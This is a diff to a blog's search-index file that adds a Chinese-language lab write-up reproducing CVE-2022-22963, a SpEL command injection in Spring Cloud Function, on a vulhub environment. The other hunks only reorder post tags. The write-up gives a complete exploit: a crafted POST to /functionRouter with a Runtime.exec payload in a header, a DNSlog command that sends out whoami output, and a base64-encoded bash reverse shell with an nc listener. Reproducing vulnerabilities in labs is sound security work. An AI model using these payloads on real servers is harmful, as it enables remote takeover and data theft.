@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>Spring Cloud Function SpEL表达式命令注入(CVE-2022-22963)</title>
+      <link href="/2022/05/07/Spring-Cloud-Function/"/>
+      <url>/2022/05/07/Spring-Cloud-Function/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Function-SpEL表达式命令注入"><a href="#Spring-Cloud-Function-SpEL表达式命令注入" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入"></a>Spring Cloud Function SpEL表达式命令注入</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22963docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开网站<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507145015952.png" alt="image-20220507145015952"></p><p>先用<a href="http://dnslog.cn/">dnslog</a>获取一个dns</p><pre><code>mbehkf.dnslog.cn</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160404330.png" alt="image-20220507160404330"></p><p>构造命令</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.kirjsf.dnslog.cn</code></pre><p>用<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160417478.png" alt="image-20220507160417478"></p><p>构造数据包</p><pre><code>POST /functionRouter HTTP/1.1Host:192.168.96.170:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)Content-Type: text/plainContent-Length: 6test</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160509318.png" alt="image-20220507160509318"></p><p>发送过去</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160528008.png" alt="image-20220507160528008"></p><p>过来了</p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>base64编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQo=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>用nc监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>然后把命令扔进去，发送数据包</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160905195.png" alt="image-20220507160905195"></p><p>过去了</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160932257.png" alt="image-20220507160932257"></p><p>成功反弹shell！</p><p>结束！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE-2022-22947)</title>
       <link href="/2022/05/07/Spring-Cloud-Gateway/"/>
       <url>/2022/05/07/Spring-Cloud-Gateway/</url>
@@ -1833,13 +1868,13 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 后门 </tag>
-            
-            <tag> msf </tag>
+            <tag> windows </tag>
             
             <tag> 渗透 </tag>
             
-            <tag> windows </tag>
+            <tag> msf </tag>
+            
+            <tag> 后门 </tag>
             
         </tags>
       
@@ -1895,11 +1930,11 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 渗透 </tag>
-            
             <tag> windows </tag>
             
             <tag> 防火墙 </tag>
+            
+            <tag> 渗透 </tag>
             
         </tags>
       
@@ -1957,9 +1992,9 @@
       
         <tags>
             
-            <tag> msf </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> msf </tag>
             
             <tag> kali </tag>
             
@@ -2496,11 +2531,11 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> windows </tag>
-            
             <tag> 域 </tag>
             
             <tag> 内网 </tag>
+            
+            <tag> windows </tag>
             
         </tags>
       
@@ -2527,13 +2562,13 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
             
-            <tag> msf </tag>
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
+            
+            <tag> msf </tag>
             
         </tags>
       
@@ -2560,9 +2595,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2591,9 +2626,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2622,9 +2657,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2653,9 +2688,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2684,9 +2719,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2715,9 +2750,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2746,9 +2781,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2777,9 +2812,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
